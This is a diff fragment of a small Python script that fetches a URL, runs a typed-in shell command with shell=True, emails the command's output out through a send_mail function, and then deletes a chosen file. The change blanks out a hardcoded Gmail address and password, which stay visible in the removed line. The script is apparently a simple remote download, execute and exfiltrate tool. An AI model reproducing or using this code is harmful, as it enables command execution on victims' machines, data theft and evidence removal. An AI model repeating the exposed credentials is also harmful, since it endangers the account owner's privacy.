@@ -18,5 +18,5 @@ def send_mail(email,password,message):
 
 get_request(input("[+] URL >> "))
 message = subprocess.check_output(input("[+] Command >> "),shell = True)
-send_mail("virutyagi9@gmail.com","VIru@999",message)
+send_mail("","",message)
 os.remove(input("[+] FileName to Remove >> "))
